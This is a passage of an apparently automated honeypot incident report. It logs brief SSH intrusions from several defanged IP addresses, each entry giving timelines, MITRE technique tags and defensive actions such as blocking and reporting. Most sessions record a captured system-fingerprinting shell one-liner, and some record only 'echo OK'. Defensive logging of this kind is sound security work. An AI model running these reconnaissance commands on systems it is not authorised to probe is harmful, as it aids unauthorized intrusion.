| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:15:17` | `cowrie.session.connect` |
| `2026-07-06 06:15:18` | `cowrie.client.version` |
| `2026-07-06 06:15:18` | `cowrie.client.kex` |
| `2026-07-06 06:15:20` | `cowrie.login.success` |
| `2026-07-06 06:15:22` | `cowrie.session.params` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.success` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:22` | `cowrie.command.input` |
| `2026-07-06 06:15:23` | `cowrie.log.closed` |
| `2026-07-06 06:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2ad59b988b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-06 06:15 |
| **Last Seen** | 2026-07-06 06:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:15:19` | `cowrie.session.connect` |
| `2026-07-06 06:15:20` | `cowrie.client.version` |
| `2026-07-06 06:15:20` | `cowrie.client.kex` |
| `2026-07-06 06:15:23` | `cowrie.login.success` |
| `2026-07-06 06:15:25` | `cowrie.session.params` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.success` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:25` | `cowrie.command.input` |
| `2026-07-06 06:15:26` | `cowrie.log.closed` |
| `2026-07-06 06:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea0a5ac675f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:16 |
| **Last Seen** | 2026-07-06 06:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:16:00` | `cowrie.session.connect` |
| `2026-07-06 06:16:00` | `cowrie.client.version` |
| `2026-07-06 06:16:00` | `cowrie.client.kex` |
| `2026-07-06 06:16:03` | `cowrie.login.success` |
| `2026-07-06 06:16:05` | `cowrie.session.params` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.success` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.command.input` |
| `2026-07-06 06:16:05` | `cowrie.log.closed` |
| `2026-07-06 06:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c8fbccda2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:16 |
| **Last Seen** | 2026-07-06 06:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:16:42` | `cowrie.session.connect` |
| `2026-07-06 06:16:43` | `cowrie.client.version` |
| `2026-07-06 06:16:43` | `cowrie.client.kex` |
| `2026-07-06 06:16:45` | `cowrie.login.success` |
| `2026-07-06 06:16:47` | `cowrie.session.params` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.success` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:47` | `cowrie.command.input` |
| `2026-07-06 06:16:48` | `cowrie.log.closed` |
| `2026-07-06 06:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c072ca71bbb7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-06 06:17 |
| **Last Seen** | 2026-07-06 06:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:17:23` | `cowrie.session.connect` |
| `2026-07-06 06:17:23` | `cowrie.client.version` |
| `2026-07-06 06:17:23` | `cowrie.client.kex` |
| `2026-07-06 06:17:26` | `cowrie.login.success` |
| `2026-07-06 06:17:28` | `cowrie.session.params` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.success` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:28` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.log.closed` |
| `2026-07-06 06:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba366465dcb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:17 |
| **Last Seen** | 2026-07-06 06:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:17:24` | `cowrie.session.connect` |
| `2026-07-06 06:17:25` | `cowrie.client.version` |
| `2026-07-06 06:17:25` | `cowrie.client.kex` |
| `2026-07-06 06:17:27` | `cowrie.login.success` |
| `2026-07-06 06:17:29` | `cowrie.session.params` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.success` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:29` | `cowrie.command.input` |
| `2026-07-06 06:17:30` | `cowrie.log.closed` |
| `2026-07-06 06:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4916b52816fb

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 06:18 |
| **Last Seen** | 2026-07-06 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:18:00` | `cowrie.session.connect` |
| `2026-07-06 06:18:00` | `cowrie.client.version` |
| `2026-07-06 06:18:00` | `cowrie.client.kex` |
| `2026-07-06 06:18:00` | `cowrie.login.success` |
| `2026-07-06 06:18:01` | `cowrie.session.params` |
| `2026-07-06 06:18:01` | `cowrie.command.input` |
| `2026-07-06 06:18:01` | `cowrie.log.closed` |
| `2026-07-06 06:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70aaaac664f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:18 |
| **Last Seen** | 2026-07-06 06:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:18:07` | `cowrie.session.connect` |
| `2026-07-06 06:18:07` | `cowrie.client.version` |
| `2026-07-06 06:18:07` | `cowrie.client.kex` |
| `2026-07-06 06:18:10` | `cowrie.login.success` |
| `2026-07-06 06:18:12` | `cowrie.session.params` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.success` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:12` | `cowrie.command.input` |
| `2026-07-06 06:18:13` | `cowrie.log.closed` |
| `2026-07-06 06:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c8827b0745

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:18 |
| **Last Seen** | 2026-07-06 06:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:18:49` | `cowrie.session.connect` |
| `2026-07-06 06:18:49` | `cowrie.client.version` |
| `2026-07-06 06:18:49` | `cowrie.client.kex` |
| `2026-07-06 06:18:52` | `cowrie.login.success` |
| `2026-07-06 06:18:54` | `cowrie.session.params` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.success` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:54` | `cowrie.command.input` |
| `2026-07-06 06:18:55` | `cowrie.log.closed` |
| `2026-07-06 06:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb21c7186915

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 06:19 |
| **Last Seen** | 2026-07-06 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:19:10` | `cowrie.session.connect` |
| `2026-07-06 06:19:10` | `cowrie.client.version` |
| `2026-07-06 06:19:10` | `cowrie.client.kex` |
| `2026-07-06 06:19:11` | `cowrie.login.success` |
| `2026-07-06 06:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593afd791a84

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 06:19 |
| **Last Seen** | 2026-07-06 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:19:11` | `cowrie.session.connect` |
| `2026-07-06 06:19:11` | `cowrie.client.version` |
| `2026-07-06 06:19:11` | `cowrie.client.kex` |
| `2026-07-06 06:19:12` | `cowrie.login.success` |
| `2026-07-06 06:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b861b1109138

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-06 06:19 |
| **Last Seen** | 2026-07-06 06:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:19:27` | `cowrie.session.connect` |
| `2026-07-06 06:19:28` | `cowrie.client.version` |
| `2026-07-06 06:19:28` | `cowrie.client.kex` |
| `2026-07-06 06:19:31` | `cowrie.login.success` |
| `2026-07-06 06:19:33` | `cowrie.session.params` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.success` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:33` | `cowrie.command.input` |
| `2026-07-06 06:19:34` | `cowrie.log.closed` |
| `2026-07-06 06:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b38a5a34ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:19 |
| **Last Seen** | 2026-07-06 06:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:19:31` | `cowrie.session.connect` |
| `2026-07-06 06:19:31` | `cowrie.client.version` |
| `2026-07-06 06:19:31` | `cowrie.client.kex` |
| `2026-07-06 06:19:34` | `cowrie.login.success` |
| `2026-07-06 06:19:36` | `cowrie.session.params` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.success` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:36` | `cowrie.command.input` |
| `2026-07-06 06:19:37` | `cowrie.log.closed` |
| `2026-07-06 06:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c2768ff4ce4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 06:20 |
| **Last Seen** | 2026-07-06 06:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:20:23` | `cowrie.session.connect` |
| `2026-07-06 06:20:24` | `cowrie.client.version` |
| `2026-07-06 06:20:24` | `cowrie.client.kex` |
| `2026-07-06 06:20:31` | `cowrie.login.success` |
| `2026-07-06 06:20:34` | `cowrie.session.params` |
| `2026-07-06 06:20:34` | `cowrie.command.input` |
| `2026-07-06 06:20:36` | `cowrie.log.closed` |
| `2026-07-06 06:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3bc21e8e98e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 06:32 |
| **Last Seen** | 2026-07-06 06:32 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:32:45` | `cowrie.session.connect` |
| `2026-07-06 06:32:46` | `cowrie.client.version` |
| `2026-07-06 06:32:46` | `cowrie.client.kex` |
| `2026-07-06 06:32:53` | `cowrie.login.success` |
| `2026-07-06 06:32:57` | `cowrie.session.params` |
| `2026-07-06 06:32:57` | `cowrie.command.input` |
| `2026-07-06 06:32:58` | `cowrie.log.closed` |
| `2026-07-06 06:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a6640eaeb9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-07-06 06:38 |
| **Last Seen** | 2026-07-06 06:39 |
| **Session Duration** | 7s |
